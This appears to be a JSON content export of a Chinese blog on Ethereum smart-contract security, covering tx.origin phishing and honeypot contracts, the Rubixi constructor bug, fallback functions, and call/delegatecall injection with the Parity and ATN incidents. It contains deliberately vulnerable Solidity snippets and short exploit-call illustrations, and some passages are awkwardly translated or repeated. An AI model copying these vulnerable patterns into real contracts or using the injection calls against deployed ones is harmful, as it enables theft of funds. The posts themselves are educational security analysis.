{"meta":{"title":"KW's blog","subtitle":"博客副标题","description":"博客描述","author":"KW","url":"https://kdlwtrdrgm.github.io","root":"/"},"pages":[{"title":"404","date":"2021-07-20T10:58:45.428Z","updated":"2021-07-20T10:58:45.428Z","comments":true,"path":"404/index.html","permalink":"https://kdlwtrdrgm.github.io/404/index.html","excerpt":"","text":"页面未找到！"}],"posts":[{"title":"钓鱼式攻击","slug":"区块链/钓鱼式攻击","date":"2021-08-03T03:33:59.000Z","updated":"2021-08-03T05:59:32.924Z","comments":true,"path":"/以太坊/区块链/钓鱼式攻击/","link":"","permalink":"https://kdlwtrdrgm.github.io/%E4%BB%A5%E5%A4%AA%E5%9D%8A/%E5%8C%BA%E5%9D%97%E9%93%BE/%E9%92%93%E9%B1%BC%E5%BC%8F%E6%94%BB%E5%87%BB/","excerpt":"","text":"钓鱼式攻击虽然原理很简单，混淆可能导致钓鱼式攻击，如本。tx.origin``msg.sender 下面概述了一个可能的攻击示例。 使用以确定其令牌传递，如tx.origin function transfer(address _to, uint _value) { tokens[tx.origin] -= _value; tokens[_to] += _value; } 攻击者让受害者将资金发送到调用代币合约转移函数的恶意合约，例如 function () payable { token.transfer(attackerAddress, 10000); } 在这种情况下，将是受害者的地址（而将是恶意合约的地址），导致资金从受害者转移到攻击者。tx.origin``msg.sender 钓鱼合约的特征这些合约通常有这样几个特征： \\1. 含有“漏洞”：钓鱼钓鱼，没有鱼钩，哪钓到鱼？钓鱼合约一定会包含一个比较明显的“漏洞”，这种漏洞是非常易于利用的，如果稍微研究过一点以太坊智能合约安全或者具有对常见的漏洞又了解的人甚至可以一眼就看出合约中存在的这种“漏洞”。 \\2. 合约具有一定价值：有了鱼钩，当然要上饵。钓鱼合约中通常会有1-2个以太币（Ether）用作鱼饵，并且结合合约的逻辑，这些鱼饵包含了一些背后的故事，比如说是用户的存款或者游戏的奖金之类。 \\3. 在Etherscan上开源：如果在Etherscan上查不到合约的源代码，一般人是不会通过仔细研究合约的bytecode来理解合约有哪些功能的。为了吸引别人看自己合约的源代码，钓鱼合约通常会在Etherscan上公开合约源代码。 \\4. 源代码比较短：为了让看合约的人快速理解并找到“漏洞”，钓鱼合约的代码长度一般不会太长，经常只有几十行代码。 搜一下”0x2a752d08F2EAD90C1CF7572d8A00C00E7b1913Cf” 合约代码直接上钓鱼合约的代码。 /** *Submitted for verification at Etherscan.io on 2020-12-26 */ contract US_Game { function Try(string _response) external payable { require(msg.sender == tx.origin); if(responseHash == keccak256(_response) &amp;&amp; msg.value &gt; 1 ether) { msg.sender.transfer(this.balance); } } string public question; bytes32 responseHash; mapping (bytes32=&gt;bool) admin; function Start(string _question, string _response) public payable isAdmin{ if(responseHash==0x0){ responseHash = keccak256(_response); question = _question; } } function Stop() public payable isAdmin { msg.sender.transfer(this.balance); } function New(string _question, bytes32 _responseHash) public payable isAdmin { question = _question; responseHash = _responseHash; } constructor(bytes32[] admins) public{ for(uint256 i=0; i&lt; admins.length; i++){ admin[admins[i]] = true; } } modifier isAdmin(){ require(admin[keccak256(msg.sender)]); _; } function() public payable{} } 可能有些读者对Solidity（智能合约编写语言）不太熟悉，我就简单讲讲这个代码，如果读者可以自己阅读代码可直接跳到下一节。 首先是合约的构造函数constructor，这种函数会且仅会在合约被部署的时候被执行，对于这个合约而言，constructor的作用是将一个byte32数组中的每个成员在合约中admin这个mapping中的对应位置置位。 置位有啥用呢？这里看modifier isAdmin()这个片段，它是一种修饰器，修饰器名字叫isAdmin，只要函数后面带了isAdmin，这个片段就会被编译器加到函数最前面去。这个合约里面isAdmin规定其修饰的函数只能由特定的用户调用，如果调用者的地址的keccak256哈希值在admin中对应的位置不是True，调用就会失败。 然后看主要的功能函数。在此之前我先讲一下这个合约是想要伪装成一个解谜游戏，合约的admin会将问题答案对应的哈希值和问题放到合约中，如果游戏参与者提交的答案哈希值与正确答案哈希值相同就可以拿到奖金。以此为背景去理解这个合约的主要功能函数： Try ：这个函数是游戏参与者在猜谜游戏中提交答案的途径，参与者每次竞猜除了要提供自己的答案外，还要向这个合约中转入至少1以太币，这也是该合约获利的方式。 Start：仅admin可用，接收两个参数：一个是新的问题**_question，另一个是该问题的回答_response，并且如果之前没有设置合约中回答的哈希值，这个函数会将这个值设置为参数中_response**的哈希值 Stop：仅admin可用，终止游戏，将合约中的以太币转走。 New：仅admin可用，设置新的问题和答案哈希值。 合约漏洞可以看到，合约中有个非常诡异的函数：Start，它的第二个参数其实就是问题的答案，由于以太坊的历史交易都是公开的，如果通过这个函数去设置游戏中的问题，那么该问题的答案也会被所有人看到。如果说这是开发者对以太坊不熟悉、不了解，New函数中设置新问题和回答的方法却是正确的做法，所以可以很明显地看出这里是合约开发者故意留下这个“漏洞”作为鱼钩进行钓鱼的，这个合约在被部署后，其部署者也确实调用了Start方法，并设置了15个Ether的奖金作为鱼饵。 第一层：监听？刚开始我没有细看交易，我想的是既然admin可以随时更改问题和答案，会不会持续监听链上交易，如果发现有人发出了提交正确答案的交易，就用更高的gas price，抢在正确答案被提交前修改问题和答案，使得游戏参与者白费功夫？类似的情形我们也见到过，不过不适用于这里。首先这个合约给出的鱼饵太大了，万一失手可能得不偿失，而且现在矿池提供了暗池服务，这样钓鱼风险还是很大的。所以我觉得合约中还有其他玄机。 第二层：合约部署者其实不是admin？Etherscan提供了查看交易改变的世界状态的功能，其实仔细看该合约部署者发出的这笔交易改变的状态可以发现，合约并没有任何一个值被这个交易改变了。 这就很耐人寻味，因为合约部署时只设置了admin这个mapping的值，没有改变responseHash，也就是答案的哈希值。如果部署者是admin，这笔交易应当会将question和responseHash都设置为对应的值。而我们回过头来看合约代码： modifier isAdmin(){ require(admin[keccak256(msg.sender)]); _; } 观察这里可以发现，admin这个mapping里面的key其实是地址哈希值，这是不是为了隐藏信息呢？通过这样的设计，我们没办法通过constructor的参数知晓部署者是否为admin，误以为部署者必然是合约的admin，从而被他调用Start的行为误导。如果是这样的话，由于实际上这次调用并没有修改responseHash，所以如果有人以合约部署者一定是admin的前提去预估合约的执行结果，就会上钩。 正当我以为找到了正解的时候，这里还有个问题让我无法将整个流程梳理清楚：在modifier中是使用了require来验证交易发送者是不是admin的，不管按照旧版Solidity还是新版中的定义，如果条件不满足，合约应当会revert这笔交易，也就是说，这里甚至不应该继续执行下去，Etherscan也应该给出reverted的信息，这笔交易附带的以太币也应该退还给发送者。看来这个思路不对。 第三层：内部交易。最后我想看看与这个合约相关的有哪些内部交易（由合约调用合约）。由于Etherscan对内部交易显示不全，我并没有能在Etherscan上找到答案，因此，我用了其他的工具，发现确实有一笔内部交易与这个合约相关，再追查这笔内部交易改变的状态发现，在调用Start方法之前，有人已经通过哈希为0x0d974ab8723e15b1e5d2d2766aca443e494c03fe9bbbff8eaf18a26c416a8f77的交易调用另一个合约改写了responseHash，所以调用Start方法的这笔交易并没有改变合约中的任何变量。 所以说，由于Etherscan不能显示这样的内部交易，导致我们没能一开始就找出问题的真正原因。 继续追查，通过内部交易改写钓鱼合约状态的那个合约地址为0xf4e96e2d3b4e27853b5eabc5b0ddcc664f2b1ed1，已经有417笔交易了，看来这个人是老渔夫了。 受害者刚刚提到的钓鱼合约可以看到，它已经成功地钓到了一只肥鱼了。截至到本文发布，以太币价格是1270美刀（怎么又涨了这么多），也就是说受害者损失2个以太币，金额达到了2500美刀左右，看着就肉痛。 总结人为财死，鸟为食亡。15个以太币虽然价值很高，看起来很诱人，但是这些钓鱼合约其实都是设计好的，不可能让你真正吃到这香喷喷的鱼饵的，所以，如果你也遇到一个看起来有漏洞、只需要动动手指就能攻击的合约，一定一定要多想想！ 顺带一提，如果想持续关注这一类钓鱼合约或者你想到了反钓鱼的方法，可以在Etherscan上查看0xf4e96e2d3b4e27853b5eabc5b0ddcc664f2b1ed1这个地址的交易，看它最新的交易修改了哪个合约中的变量","categories":[{"name":"以太坊","slug":"以太坊","permalink":"https://kdlwtrdrgm.github.io/categories/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"构造函数失控","slug":"区块链/构造函数失控","date":"2021-08-03T02:33:59.000Z","updated":"2021-08-03T14:40:50.976Z","comments":true,"path":"/以太坊/区块链/构造函数失控/","link":"","permalink":"https://kdlwtrdrgm.github.io/%E4%BB%A5%E5%A4%AA%E5%9D%8A/%E5%8C%BA%E5%9D%97%E9%93%BE/%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E5%A4%B1%E6%8E%A7/","excerpt":"","text":"构造函数失控构造函数（Constructors）是特殊函数，在初始化合约时经常执行关键的权限任务。在 solidity v0.4.22 以前，构造函数被定义为与所在合约同名的函数。因此，如果合约名称在开发过程中发生变化，而构造函数名称没有更改，它将变成正常的可调用函数。正如你可以想象的，这可以（并且已经）导致一些有趣的合约被黑。 1.1 漏洞如果合约名称被修改，或者在构造函数名称中存在拼写错误以致它不再与合约名称匹配，则构造函数的行为将与普通函数类似。这可能会导致可怕的后果，特别是如果构造函数正在执行有权限的操作。考虑以下合约： contract OwnerWallet { address public owner; //constructor function ownerWallet(address _owner) public { owner = _owner; } // fallback. Collect ether. function () payable {} function withdraw() public { require(msg.sender == owner); msg.sender.transfer(this.balance); } } 该合约储存 Ether，并只允许所有者通过调用 withdraw() 函数来取出所有 Ether。但由于构造函数的名称与合约名称不完全一致，这个合约会出问题。具体来说， ownerWallet 与 OwnerWallet 不相同。因此，任何用户都可以调用 ownerWallet() 函数，将自己设置为所有者，然后通过调用 withdraw() 将合约中的所有 Ether 都取出来。 1.2 预防技术这个问题在 Solidity 0.4.22 版本的编译器中已经基本得到了解决。该版本引入了一个关键词 constructor 来指定构造函数，而不是要求函数的名称与合约名称匹配。建议使用这个关键词来指定构造函数，以防止上面显示的命名问题。 1.3 真实世界的例子：RubixiRubixi（合约代码）是另一个显现出这种漏洞的传销方案。合约中的构造函数一开始叫做 DynamicPyramid ，但合约名称在部署之前已改为 Rubixi 。构造函数的名字没有改变，因此任何用户都可以成为 creator 。这篇 Bitcoin Thread 中可以找到关于这个 bug 的一些有趣的讨论。总之，用户因为这个漏洞开始互相争夺 creator 身份，以从合约中获得金钱。关于这个特定 bug 的更多细节可以在这里找到。 Rubixi 的故事是以太坊生态系统中一个非常有名的案例。该公司将其名称从“动态金字塔”更改为“Rubixi”，当在写智能合约时，很多时候会出现错误。在激活合约之前，对整体的函数，参数和合约结构进行审核，是非常必要的。但不知何故他们没有重命名其合约的构造函数方法： contract Rubixi { address private owner; function DynamicPyramid() { owner = msg.sender; } function collectAllFees() { owner.transfer(this.balance) } ... 如果在以太坊历史上，有智能合约是因为整体架构出问题，而最终失败的，毫无疑问就是Rubixi。Rubixi是另一个旁氏游戏，其中玩家需要发送以太币到合约中，并且可以获得更多的以太币。但是，在Rubixi开发的过程中，拥有者随意更改了合约名称，但是并没有检测任何的不一致性。毋庸置疑，Rubixi远不能称为“成功”。 这允许攻击者调用旧的构造函数并声明合约的所有权，并窃取一些资金。是的。智能合约领域可能会犯大错误。 攻击示例 由于Solidity v0.4.24算法，合约的管理器功能是construct()。但是，在Rubixi合约创建的时候，管理器功能被以太坊虚拟机和合约共享了同个名字。Rubixi的问题在于当合约中部署了管理器的名称为function DynamicPyramid() ，而不是function Rubixi(),，这就意味着Rubixi最初的名字叫“DynamicPyramid”。由于这个不一致性，合约在创建的时候，并没有指定拥有者，所以城堡的钥匙被抢走了。任何人都能够定义他们自己为合约的拥有者，然后获得参与者加入的合约费用。 代码示例 如果我们把合约代码的前几行拿出来，你就会发现合约名称和指定管理器函数的区别。 现在你应该明白了，攻击者需要做的，就是创建合约的名字为function DynamicPyramid(), 然后获得拥有权。然后，攻击者可以调用function collectAllFees()，然后提现。虽然这个攻击已经非常直接了，Rubixi是个很好的例子，告诉我们一定要彻底地检查合约。 很幸运地是，Solidity语言已经更新了，以至于管理器功能被定义为constructor() ，而不是contractName()。我们可以从中学到的是，多次检查我们的合约代码，并且保证你在整个开发过程中，保持一致性。没有什么比部署一个无法改变的合约，但是发现其中有问题，更糟糕了。 从被DoS到交易系统异常，到项目被冰封直至被遗忘，但是只要我们铭记教训，就能稳固地保持区块链技术的发展。 旁氏游戏或许已经是过去的事情，但是George Santayana曾经说过，“那些不能从历史中学到教训的人，还会重复错误。”通过从KotET, GovernMental和Rubixi这类错误中学习，我们可以防止自己在错误的道路上越走越远。","categories":[{"name":"以太坊","slug":"以太坊","permalink":"https://kdlwtrdrgm.github.io/categories/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"Fallback函数","slug":"区块链/Fallback函数","date":"2021-08-02T08:43:59.000Z","updated":"2021-08-03T02:11:27.506Z","comments":true,"path":"/以太坊/区块链/Fallback函数/","link":"","permalink":"https://kdlwtrdrgm.github.io/%E4%BB%A5%E5%A4%AA%E5%9D%8A/%E5%8C%BA%E5%9D%97%E9%93%BE/Fallback%E5%87%BD%E6%95%B0/","excerpt":"","text":"Fallback函数官方解释 合约可以有一个未命名的函数。这个函数不能有参数也不能有返回值。 如果在一个到合约的调用中，没有其他函数与给定的函数标识符匹配（或没有提供调用数据），那么这个函数（fallback 函数）会被执行。 除此之外，每当合约收到以太币（没有任何数据），这个函数就会执行。此外，为了接收以太币，fallback 函数必须标记为 payable。 如果不存在这样的函数，则合约不能通过常规交易接收以太币。 在这样的上下文中，通常只有很少的 gas 可以用来完成这个函数调用（准确地说，是 2300 gas），所以使 fallback 函数的调用尽量廉价很重要。 请注意，调用 fallback 函数的交易（而不是内部调用）所需的 gas 要高得多，因为每次交易都会额外收取 21000 gas 或更多的费用，用于签名检查等操作。 具体来说，以下操作会消耗比 fallback 函数更多的 gas： 写入存储 创建合约 调用消耗大量 gas 的外部函数 发送以太币 请确保您在部署合约之前彻底测试您的 fallback 函数，以确保执行成本低于 2300 个 gas。 注解即使 fallback 函数不能有参数，仍然可以使用 msg.data 来获取随调用提供的任何有效数据。 警告一个没有定义 fallback 函数的合约，直接接收以太币（没有函数调用，即使用 send 或 transfer）会抛出一个异常， 并返还以太币（在 Solidity v0.4.0 之前行为会有所不同）。所以如果你想让你的合约接收以太币，必须实现 fallback 函数。 警告一个没有 payable fallback 函数的合约，可以作为 coinbase transaction （又名 miner block reward ）的接收者或者作为 selfdestruct 的目标来接收以太币。 一个合约不能对这种以太币转移做出反应，因此也不能拒绝它们。这是 EVM 在设计时就决定好的，而且 Solidity 无法绕过这个问题。 这也意味着 this.balance 可以高于合约中实现的一些手工记帐的总和（即在 fallback 函数中更新的累加器）。 pragma solidity ^0.4.0; contract Test { // 发送到这个合约的所有消息都会调用此函数（因为该合约没有其它函数）。 // 向这个合约发送以太币会导致异常，因为 fallback 函数没有 `payable` 修饰符 function() public { x = 1; } uint x; } // 这个合约会保留所有发送给它的以太币，没有办法返还。 contract Sink { function() public payable { } } contract Caller { function callTest(Test test) public { test.call(0xabcdef01); // 不存在的哈希 // 导致 test.x 变成 == 1。 // 以下将不会编译，但如果有人向该合约发送以太币，交易将失败并拒绝以太币。 // test.send(2 ether）; } }","categories":[{"name":"以太坊","slug":"以太坊","permalink":"https://kdlwtrdrgm.github.io/categories/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"Call,delegatecall,callcode函数簇","slug":"区块链/Call,delegatecall,callcode函数簇","date":"2021-08-02T08:43:59.000Z","updated":"2021-08-03T14:20:51.400Z","comments":true,"path":"/以太坊/区块链/Call,delegatecall,callcode函数簇/","link":"","permalink":"https://kdlwtrdrgm.github.io/%E4%BB%A5%E5%A4%AA%E5%9D%8A/%E5%8C%BA%E5%9D%97%E9%93%BE/Call,delegatecall,callcode%E5%87%BD%E6%95%B0%E7%B0%87/","excerpt":"","text":"Call,delegatecall,callcode函数簇官方解释 Solidity 是一种用与编写以太坊智能合约的高级语言，语法类似于 JavaScript。Solidity 编写的智能合约可被编译成为字节码在以太坊虚拟机上运行。Solidity 中的合约与面向对象编程语言中的类（Class）非常类似，在一个合约中同样可以声明：状态变量、函数、事件等。同时，一个合约可以调用/继承另外一个合约。 在 Solidity 中提供了 call、delegatecall、callcode 三个函数来实现合约之间相互调用及交互。正是因为这些灵活各种调用，也导致了这些函数被合约开发者“滥用”，甚至“肆无忌惮”提供任意调用“功能”，导致了各种安全漏洞及风险： 2017.7.20，Parity Multisig电子钱包版本 1.5+ 的漏洞被发现，使得攻击者从三个高安全的多重签名合约中窃取到超过 15 万 ETH ，其事件原因是由于未做限制的 delegatecall 函数调用了合约初始化函数导致合约拥有者被修改。 2018.6.16，「隐形人真忙」在先知大会上演讲了「智能合约消息调用攻防」的议题，其中提到了一种新的攻击场景—— call 注⼊，主要介绍了利用对 call 调用处理不当，配合一定的应用场景的一种攻击手段。接着于 2018.6.20，ATN 代币团队发布「ATN抵御黑客攻击的报告」，报告指出黑客利用 call 注入攻击漏洞修改合约拥有者，然后给自己发行代币，从而造成 ATN 代币增发。 由此本文主要是针对 Solidity 合约调用函数call、delegatecall、callcode 三种调用方式的异同、滥用导致的漏洞模型并结合实际案例进行分析介绍。 Solidity 的三种调用函数在 Solidity 中，call 函数簇可以实现跨合约的函数调用功能，其中包括 call、delegatecall 和 callcode 三种方式。 以下是 Solidity 中 call 函数簇的调用模型： &lt;address&gt;.call(...) returns (bool) &lt;address&gt;.callcode(...) returns (bool) &lt;address&gt;.delegatecall(...) returns (bool) 这些函数提供了灵活的方式与合约进行交互，并且可以接受任何长度、任何类型的参数，其传入的参数会被填充至 32 字节最后拼接为一个字符串序列，由 EVM 解析执行。 在函数调用的过程中， Solidity 中的内置变量 msg 会随着调用的发起而改变，msg 保存了调用方的信息包括：调用发起的地址，交易金额，被调用函数字符序列等。 三种调用方式的异同点 call: 最常用的调用方式，调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境(合约的 storage)。 delegatecall: 调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境。 callcode: 调用后内置变量 msg 的值会修改为调用者，但执行环境为调用者的运行环境。 delegatecall 「滥用」问题 delegatecall: 调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境。 原理在智能合约的开发过程中，合约的相互调用是经常发生的。开发者为了实现某些功能会调用另一个合约的函数。比如下面的例子，调用一个合约 A 的 test() 函数，这是一个正常安全的调用。 function test(uint256 a) public { // codes } function callFunc() public { &lt;A.address&gt;.delegatecall(bytes4(keccak256(\"test(uint256)\")), 10); } 但是在实际开发过程中，开发者为了兼顾代码的灵活性，往往会有下面这种写法： function callFunc(address addr, bytes data) public { addr.delegatecall(data); } 这将引起任意 public 函数调用的问题：合约中的 delegatecall 的调用地址和调用的字符序列都由用户传入，那么完全可以调用任意地址的函数。 除此之外，由于 delegatecall 的执行环境为调用者环境，当调用者和被调用者有相同变量时，如果被调用的函数对变量值进行修改，那么修改的是调用者中的变量。 利用模型下面的例子中 B 合约是业务逻辑合约，其中存在一个任意地址的 delegatecall 调用。 contract B { address owner; function callFunc(address addr, bytes data) public { addr.delegatecall(data); //address(Attack).delegatecall(bytes4(keccak256(\"foo()\"))); //利用代码示意 } } 攻击者对应这种合约可以编写一个 Attack 合约，然后精心构造字节序列(将注释部分的攻击代码转换为字节序列)，通过调用合约 B 的 delegatecall，最终调用 Attack 合约中的函数，下面是 Attack 合约的例子： contract Attack { address owner; function foo() public { // any codes } } 对于 delegatecall 「滥用」的问题，实际的漏洞效果取决于 Attack 合约中的攻击代码，可能造成的安全问题包括： 攻击者编写一个转账的函数，窃取合约 B 的货币 攻击者编写设置合约拥有者的函数，修改合约 B 的拥有者 在智能合约的开发过程中，合约的相互调用是经常发生的。开发者为了实现某些功能会调用另一个合约的函数。比如下面的例子，调用一个合约 A 的 test() 函数，这是一个正常安全的调用。 function test(uint256 a) public { // codes } function callFunc() public { &lt;A.address&gt;.delegatecall(bytes4(keccak256(\"test(uint256)\")), 10); } 但是在实际开发过程中，开发者为了兼顾代码的灵活性，往往会有下面这种写法： function callFunc(address addr, bytes data) public { addr.delegatecall(data); } 这将引起任意 public 函数调用的问题：合约中的 delegatecall 的调用地址和调用的字符序列都由用户传入，那么完全可以调用任意地址的函数。 除此之外，由于 delegatecall 的执行环境为调用者环境，当调用者和被调用者有相同变量时，如果被调用的函数对变量值进行修改，那么修改的是调用者中的变量。 利用模型下面的例子中 B 合约是业务逻辑合约，其中存在一个任意地址的 delegatecall 调用。 contract B { address owner; function callFunc(address addr, bytes data) public { addr.delegatecall(data); //address(Attack).delegatecall(bytes4(keccak256(\"foo()\"))); //利用代码示意 } } 攻击者对应这种合约可以编写一个 Attack 合约，然后精心构造字节序列(将注释部分的攻击代码转换为字节序列)，通过调用合约 B 的 delegatecall，最终调用 Attack 合约中的函数，下面是 Attack 合约的例子： contract Attack { address owner; function foo() public { // any codes } } 对于 delegatecall 「滥用」的问题，实际的漏洞效果取决于 Attack 合约中的攻击代码，可能造成的安全问题包括： 攻击者编写一个转账的函数，窃取合约 B 的货币 攻击者编写设置合约拥有者的函数，修改合约 B 的拥有者 delegatecall 安全问题案例Parity MultiSig钱包事件 2017.7.20，Parity Multisig电子钱包版本 1.5+ 的漏洞被发现，使得攻击者从三个高安全的多重签名合约中窃取到超过 15 万 ETH ，按照当时的 ETH 价格来算，大约为 3000 万美元。 今天，我们目睹了以太坊网络历史上第二大黑客攻击，就 ETH 被盗而言。截至 UTC 时间下午 12:19，（[攻击者的账户]https://etherscan.io/address/0xb3764761e297d6f121e79c32a65829cd1ddb4d32#internaltx）已经从过去使用的三个备受瞩目的代币销售合同中提取了 153,037 个 ETH，用于存储多重签名。该问题最初是由 Parity 团队报告的，因为受影响的 MultiSig 钱包合约是 Parity 软件套件的一部分。 其事件原因是由于未做限制的 delegatecall 可以调用 WalletLibrary 合约的任意函数，并且其钱包初始化函数未做校验，导致初始化函数可以重复调用。攻击者利用这两个条件，通过 delegatecall 调用 initWallet() 函数，最终修改了合约拥有者，并将合约中的以太币转到自己的账户下。 攻击解释下面是存在安全问题的代码片段：Github/parity: a. delegatecall 调用代码：(contract Wallet is WalletEvents) //在没有其他函数匹配时调用 function() payable { // just being sent some cash? if (msg.value &gt; 0) Deposit(msg.sender, msg.value); else if (msg.data.length &gt; 0) _walletLibrary.delegatecall(msg.data); } b. initWallet() 与 initMultiowned() 代码片段：(contract WalletLibrary is WalletEvents) function initWallet(address[] _owners, uint _required, uint _daylimit) { initDaylimit(_daylimit); initMultiowned(_owners, _required); } ... function initMultiowned(address[] _owners, uint _required) { m_numOwners = _owners.length + 1; m_owners[1] = uint(msg.sender); m_ownerIndex[uint(msg.sender)] = 1; for (uint i = 0; i &lt; _owners.length; ++i) { m_owners[2 + i] = uint(_owners[i]); m_ownerIndex[uint(_owners[i])] = 2 + i; } m_required = _required; } 其中钱包初始化函数 initMultiowned() 未做校验，可以被多次调用，存在安全隐患，但由于其位于 WalletLibrary 合约下，是不能直接调用的。黑客利用 Wallet 合约中的 delegatecall 调用 WalletLibrary 合约的 initWallet() 函数，初始化整个钱包，将合约拥有者修改为仅黑客一人，随后进行转账操作。 黑客攻击链： 除了上述 delegatecall 滥用的案例，在分析研究的过程中，发现有部分蜜罐合约利用 delegatecall 的特性(拷贝目标到自己的运行空间中执行)，在代码中暗藏后门，暗中修改转账地址，导致用户丢失货币。有关 delegatecall 蜜罐的详情请参考「以太坊蜜罐智能合约分析」，其中的 「4.2 偷梁换柱的地址(访问控制)：firstTest」小节。 解决方案可以通过不将构造函数逻辑完全提取到库合约中来阻止攻击，或者通过不用delegatecall作全能转发机制来更好地阻止攻击。推荐的模式是明确定义哪些库函数可以在钱包合约上从外部调用。 需要注意的是，将逻辑抽象到共享库中的技术可能非常有用。它有助于提高代码的可重用性并降低 gas 部署成本。然而，这次攻击清楚地表明，以太坊生态系统需要一套最佳实践和标准，以确保这些编码模式得到有效和安全的实施。否则，看起来最无辜的错误可能会带来灾难性的后果。 call 安全问题 call: 最常用的调用方式，调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境。 call 注入是一种新的攻击场景，由「隐形人真忙」在先知大会上演讲「智能合约消息调用攻防」议题上提出，原因是对 call 调用处理不当，配合一定的应用场景的一种攻击手段。 call 注入原理call 调用修改 msg.sender 值通常情况下合约通过 call 来执行来相互调用执行，由于 call 在相互调用过程中内置变量 msg 会随着调用方的改变而改变，这就成为了一个安全隐患，在特定的应用场景下将引发安全问题。 外部用户通过 call 函数再调用合约函数： 高度自由的 call 调用 在某些应用场景下，调用函数可以由用户指定；下面是 call 函数的调用方式： &lt;address&gt;.call(function_selector, arg1, arg2, ...) &lt;address&gt;.call(bytes) 从上面可以看出，call 函数拥有极大的自由度： 对于一个指定合约地址的 call 调用，可以调用该合约下的任意函数 如果 call 调用的合约地址由用户指定，那么可以调用任意合约的任意函数 为了便于理解，可以将智能合约中的 call 函数类比为其他语言中的 eval 函数，call 函数相当于给用户提供了随意调用合约函数的入口，如果合约中有函数以 msg.sender 作为关键变量，那么就会引发安全问题。 call 函数簇调用自动忽略多余参数call 函数簇在调用函数的过程中，会自动忽略多余的参数，这又额外增加了 call 函数簇调用的自由度。下面的例子演示 call 自动忽略多余参数： pragma solidity ^0.4.0; contract A { uint256 public aa = 0; function test(uint256 a) public { aa = a; } function callFunc() public { this.call(bytes4(keccak256(\"test(uint256)\")), 10, 11, 12); } } 例子中 test() 函数仅接收一个 uint256 的参数，但在 callFunc() 中传入了三个参数，由于 call 自动忽略多余参数，所以成功调用了 test() 函数。 call 注入模型call 注入引起的最根本的原因就是 call 在调用过程中，会将 msg.sender 的值转换为发起调用方的地址，下面的例子描述了 call 注入的攻击模型。 contract B { function info(bytes data){ this.call(data); //this.call(bytes4(keccak256(\"secret()\"))); //利用代码示意 } function secret() public{ require(this == msg.sender); // secret operations } } 在合约 B 中存在 info() 和 secret() 函数，其中 secret() 函数只能由合约自己调用，在 info() 中有用户可以控制的 call 调用，用户精心构造传入的数据(将注释转为字节序列)，即可绕过 require() 的限制，成功执行下面的代码。 对于 call 注入的问题，实际造成的漏洞影响取决于被调用的函数，那么可能的安全问题包括： 1.权限绕过如同上面的例子，合约将合约本身的地址作为权限认证的条件之一，但由于 call 的调用会导致 msg.sender 变量值更新为调用方的值，所以就会引起权限绕过的问题。 function callFunc(bytes data) public { this.call(data); //this.call(bytes4(keccak256(\"withdraw(address)\")), target); //利用代码示意 } function withdraw(address addr) public { require(isAuth(msg.sender)); addr.transfer(this.balance); } function isAuth(address src) internal view returns (bool) { if (src == address(this)) { return true; } else if (src == owner) { return true; } else { return false; } } 上述例子表示了权限绕过导致的任意用户提取货币。withdraw()函数设计的初衷为只能有合约拥有者和合约本身可以发起取款的操作；但由于call的问题，只要用户精心拼接字符序列调用call，从而调用 withdraw()函数，就可以绕过isAuth()` 并取款。 2.窃取代币在代币合约中，往往会加入一个 call 回调函数，用于通知接收方以完成后续的操作。但由于 call 调用的特性，用户可以向 call 传入 transfer() 函数调用，即可窃取合约地址下代币。下面的例子表示了用户传入 transfer() 函数导致窃取代币。 function transfer(address _to, uint256 _value) public { require(_value &lt;= balances[msg.sender]); balances[msg.sender] -= _value; balances[_to] += _value; } function callFunc(bytes data) public { this.call(data); //this.call(bytes4(keccak256(\"transfer(address,uint256)\")), target, value); //利用代码示意 } 该例子是代币合约的代码片段，用户传入精心构造的字符序列以通过 call 来调用 transfer() 函数，并传入 transfer() 的参数 _to 为自己的地址；通过 call 调用后， transfer() 函数执行时的 msg.sender 的值已经是合约地址了，_to 地址是用户自己的地址，那么用户就成功窃取了合约地址下的代币。 call 注入案例1.ATN代币增发 2018.5.11，ATN 技术人员收到异常监控报告，显示 ATN Token 供应量出现异常，通过分析发现 Token 合约由于存在漏洞受到攻击。该事件对应了上文中的第一种利用模型，由于 ATN 代币的合约中的疏漏，该事件中 call 注入不但绕过了权限认证，同时还可以更新合约拥有者。2018年5月11日中午，ATN技术人员收到异常监控报告，显示ATN Token供应量出现异常，迅速介入后发现Token合约由于存在漏洞受到攻击。本报告描述黑客的攻击操作、利用的合约漏洞以及ATN的应对追踪方法。 攻击： 黑客利用ERC223方法漏洞，获得提权，将自己的地址设为ownerhttps://etherscan.io/tx/0x3b7bd618c49e693c92b2d6bfb3a5adeae498d9d170c15fcc79dd374166d28b7b 黑客在获得owner权限后，发行1100w ATN到自己的攻击主地址https://etherscan.io/tx/0x9b559ffae76d4b75d2f21bd643d44d1b96ee013c79918511e3127664f8f7a910 黑客将owner设置恢复，企图隐藏踪迹https://etherscan.io/tx/0xfd5c2180f002539cd636132f1baae0e318d8f1162fb62fb5e3493788a034545a 黑客从主地址将偷来的黑币分散到14个地址中 0x54868268e975f3989d77e0a67c943a5e65ed4a73 3411558.258 0x62892fd48fd4b2bbf86b75fc4def0a37b224fcc1 946828.3 0x57be7b4d3e1c6684dac6de664b7809185c8fc356 929,995.9 0x3b361e253c41897d78902ce5f7e1677fd01083da 838,991 0x7279e64d3ae20745b150e330fc080050deebeb4d 784,409.41 0xb729eac33217c0b28251261194d79edd89d18292 762,518.6 0xe67dc4b47e0ac9b649e52cdb883370d348871d64 682,026.9 0x44660bae953555ccfdcc5a38c78a5a568b672daa 564,288 0xf7e915e7ec24818f15c11ec74f7b8d4a604d7538 551,018.8 0xa4b45e8cca78e862d3729f10f4998da4200f10ef 438,277.6 0xc98e179f2909b1d0bce5b5d22c92bf803fc0d559 350,597.35 0xd5f898c7914e05ec7eaa3bf67aafd544a5bb5f24 325,291.1 